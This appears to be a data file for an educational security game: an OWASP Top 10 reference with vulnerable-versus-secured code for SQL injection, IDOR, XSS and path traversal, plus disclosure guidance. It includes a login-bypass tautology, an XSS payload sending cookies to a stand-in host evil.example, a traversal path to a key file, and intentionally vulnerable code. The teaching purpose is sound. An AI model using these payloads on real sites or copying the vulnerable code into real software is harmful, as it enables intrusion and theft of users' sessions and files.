@@ -1,0 +1,91 @@
+{
+  "topic": "webSecurity",
+  "title": "OWASP Reference",
+  "hotkey": "F1",
+  "command": "codex websecurity",
+  "description": "The OWASP Top 10 web vulnerabilities in plain English, each with a vulnerable-vs-secured code comparison — the foundation for Act IV: Bug Hunting.",
+  "entries": [
+    {
+      "id": "owasp-top10-overview",
+      "term": "OWASP Top 10 — Overview",
+      "category": "Overview",
+      "summary": "The industry-standard list of the most critical web application security risks, maintained by the Open Worldwide Application Security Project.",
+      "body": "OWASP (the Open Worldwide Application Security Project) publishes a regularly updated Top 10 list of the most critical web application security risks, based on real-world breach data. It's the standard vocabulary bug bounty hunters and pentesters use to categorize findings. This Codex covers the four categories the current campaign directly exercises in depth — Injection, Broken Access Control (IDOR), Cross-Site Scripting, and Path Traversal — plus the broader access-control and input-validation principles behind all of them.",
+      "example": "A01: Broken Access Control        A02: Cryptographic Failures\nA03: Injection                    A04: Insecure Design\nA05: Security Misconfiguration    A06: Vulnerable/Outdated Components\nA07: Auth Failures                A08: Data Integrity Failures\nA09: Logging/Monitoring Failures  A10: Server-Side Request Forgery",
+      "relatedEpisodes": [10, 11, 12],
+      "seeAlso": ["sql-injection", "idor", "xss", "path-traversal"]
+    },
+    {
+      "id": "sql-injection",
+      "term": "SQL Injection (OWASP A03: Injection)",
+      "category": "Injection",
+      "summary": "When user input is concatenated directly into a SQL query string, an attacker can inject their own SQL logic — including a tautology that bypasses login entirely.",
+      "body": "SQL injection happens when an application builds a database query by directly concatenating (gluing together) untrusted user input into the query string, rather than treating that input as pure data. If the backend blindly trusts the input, an attacker can inject characters that change the query's actual logic — most famously the tautology bypass, `' OR '1'='1' --`, which makes the WHERE clause always evaluate true regardless of the real password, and comments out anything that would have followed it in the original query.",
+      "example": "-- VULNERABLE (Python, naive string formatting):\nquery = \"SELECT * FROM users WHERE username = '\" + user + \"' AND password = '\" + password + \"'\"\ncursor.execute(query)\n\n-- Attacker submits username: admin' OR '1'='1' --\n-- Resulting query the database actually runs:\nSELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = '...'\n--                                    ^^^^^^^^^^^^^^^ always true, password check is now commented out\n\n-- SECURE (parameterized query / prepared statement):\nquery = \"SELECT * FROM users WHERE username = %s AND password = %s\"\ncursor.execute(query, (user, password))\n-- The database driver sends 'user' and 'password' as pure DATA, never as executable SQL syntax —\n-- no matter what characters they contain, they can never change the query's structure.",
+      "relatedEpisodes": [10],
+      "relatedCommands": ["proxy-intercept", "inject-sql"],
+      "seeAlso": ["input-validation-vs-parameterized"]
+    },
+    {
+      "id": "idor",
+      "term": "Insecure Direct Object References (OWASP A01: Broken Access Control)",
+      "category": "Access Control",
+      "summary": "The server correctly checks WHO you are, but forgets to check whether you're actually allowed to see the specific object you just asked for.",
+      "body": "IDOR happens when an application exposes a direct reference to an internal object (a database row ID, a file name, a record number) — often right in the URL or request body — and fails to verify that the currently authenticated user actually owns or is authorized to access that specific object. Authentication ('who are you?') passes fine; authorization ('are you allowed to see THIS one?') is simply never checked. This is what makes IDOR dangerous even for a fully legitimate, correctly-logged-in user: they don't need to break the login at all, only guess or increment an ID they were never supposed to be able to reach.",
+      "example": "-- VULNERABLE:\nGET /api/v1/profile?user_id=1042      <- your own record, returns fine\nGET /api/v1/profile?user_id=0001      <- someone else's record — server never checks ownership, returns it anyway\n\n@app.route(\"/api/v1/profile\")\ndef profile():\n    user_id = request.args.get(\"user_id\")\n    return db.get_user(user_id)          # no check that user_id belongs to the requester\n\n-- SECURE:\n@app.route(\"/api/v1/profile\")\ndef profile():\n    user_id = request.args.get(\"user_id\")\n    if user_id != current_session.user_id and not current_session.is_admin:\n        return \"403 Forbidden\", 403\n    return db.get_user(user_id)",
+      "relatedEpisodes": [11],
+      "relatedCommands": ["api-probe", "tamper-id"],
+      "seeAlso": ["horizontal-vertical-privesc"]
+    },
+    {
+      "id": "horizontal-vertical-privesc",
+      "term": "Horizontal vs. Vertical Privilege Escalation",
+      "category": "Access Control",
+      "summary": "Horizontal: gaining access to another user's data at your same privilege level. Vertical: gaining a higher privilege level than you were ever granted.",
+      "body": "Horizontal privilege escalation means accessing another user's data or resources while remaining at the same overall permission level — a regular user reading another regular user's private profile is horizontal (IDOR is the classic mechanism for this). Vertical privilege escalation means actually gaining a higher permission tier than you were ever granted — a regular user gaining administrator rights. The two aren't mutually exclusive: an IDOR flaw on an admin-only endpoint, reachable by tampering with a role parameter, can escalate both horizontally and vertically at once.",
+      "relatedEpisodes": [11],
+      "relatedCommands": ["tamper-id"],
+      "seeAlso": ["idor"]
+    },
+    {
+      "id": "xss",
+      "term": "Cross-Site Scripting (XSS) (OWASP A03: Injection)",
+      "category": "Injection",
+      "summary": "When user-supplied input is rendered back into a page as raw HTML/JavaScript instead of plain text, an attacker's script executes in another victim's browser.",
+      "body": "XSS happens when an application takes untrusted input and embeds it directly into a page's HTML output without neutralizing characters that have special meaning to the browser (like `<` and `>`). If unescaped, an attacker's `<script>` tag becomes real, executable JavaScript running in whoever's browser loads that page. Reflected XSS bounces the payload straight back in an immediate response (e.g. a search results page echoing the query unescaped). Stored XSS is more dangerous: the payload is saved server-side (a comment, a profile field) and then served to every single visitor who views that stored content, with no need to trick any one victim into clicking a crafted link.",
+      "example": "-- VULNERABLE (renders whatever the user submitted, unescaped):\n<p>You searched for: {{ query }}</p>\n-- Attacker submits query = <script>fetch('https://evil.example/steal?c='+document.cookie)</script>\n-- Every visitor who views that page now runs the attacker's script in their own browser\n\n-- SECURE (escape/encode before rendering, or use a templating engine with auto-escaping on):\n<p>You searched for: {{ query | escape }}</p>\n-- '<' and '>' become '&lt;' and '&gt;' -- displayed as harmless literal text, never executed as HTML",
+      "relatedEpisodes": [],
+      "seeAlso": ["input-validation-vs-parameterized"]
+    },
+    {
+      "id": "path-traversal",
+      "term": "Path / Directory Traversal (OWASP A01: Broken Access Control)",
+      "category": "Access Control",
+      "summary": "Using `../` sequences in a filename parameter to walk backward out of the intended web directory and read arbitrary files elsewhere on the filesystem.",
+      "body": "Path traversal happens when a server takes a user-supplied filename and hands it directly to a filesystem read operation without first confirming the resolved path actually stays inside the intended directory. Each `../` in the input walks one directory level up; enough of them chained together escape the web root entirely and reach anywhere the server process has read permission — commonly system configuration or credential files. The fix is path canonicalization: resolve the final absolute path (`realpath()`) and explicitly verify it still starts with the intended base directory before ever opening the file.",
+      "example": "-- VULNERABLE:\nGET /api/v1/view?file=report.pdf                       <- intended use\nGET /api/v1/view?file=../../../../etc/aether/master_key.pem   <- escapes the web root entirely\n\ndef view(filename):\n    return open(f\"/var/www/reports/{filename}\").read()   # no validation of the resolved path at all\n\n-- SECURE:\nimport os\ndef view(filename):\n    base = \"/var/www/reports\"\n    full_path = os.path.realpath(os.path.join(base, filename))\n    if not full_path.startswith(base):\n        return \"403 Forbidden\", 403                        # resolved path escaped the base dir — reject it\n    return open(full_path).read()",
+      "relatedEpisodes": [12],
+      "relatedCommands": [],
+      "seeAlso": ["input-validation-vs-parameterized"]
+    },
+    {
+      "id": "input-validation-vs-parameterized",
+      "term": "Input Validation vs. Parameterized Queries / Prepared Statements",
+      "category": "Defense",
+      "summary": "Validation checks that input looks like what you expect; parameterization goes further and makes it structurally impossible for input to be interpreted as code, no matter what it contains.",
+      "body": "Input validation (checking length, format, allowed characters) is a useful first line of defense but is not sufficient on its own — it's easy to miss an edge case, and validation logic can itself contain bugs. Parameterized queries / prepared statements solve the SQL injection problem at a structural level instead: the query's structure (the SQL keywords and logic) is sent to the database separately from the data values, so the database driver never has the opportunity to misinterpret a data value as part of the query's logic, regardless of what characters that value contains. The general defensive principle underlying SQLi, XSS, and path traversal alike: never trust that user input is 'just data' — either escape it correctly for the specific context it's used in (HTML, SQL, filesystem paths), or use an API that makes misinterpretation structurally impossible in the first place.",
+      "relatedEpisodes": [10, 12],
+      "seeAlso": ["sql-injection", "path-traversal"]
+    },
+    {
+      "id": "cvss-and-disclosure",
+      "term": "Vulnerability Chaining, CVSS Severity, & Coordinated Disclosure",
+      "category": "Reporting",
+      "summary": "Multiple lower-severity flaws chained together (auth bypass + IDOR + path traversal) can add up to full system compromise — and a responsible report gives the vendor a fix window before anything goes public.",
+      "body": "Individual vulnerabilities are often chained together in a real attack: an authentication bypass (SQLi) grants initial access, an IDOR reveals internal paths or identifiers, and a path traversal turns that into arbitrary file read of the most sensitive material on the system. Scoring the chain (see the Pentest Methodology codex for CVSS mechanics) communicates severity in a standardized way. Responsible/coordinated disclosure means privately reporting the full chain, proof of concept, and a remediation plan to the vendor first, with an agreed window (commonly 30-90 days) to fix it before any public disclosure — protecting real users in the meantime, versus immediately publishing everything, which hands working exploit details to anyone before a fix exists.",
+      "relatedEpisodes": [12],
+      "relatedCommands": ["bounty-report", "broadcast-leak"],
+      "seeAlso": ["cvss-scoring"]
+    }
+  ]
+}
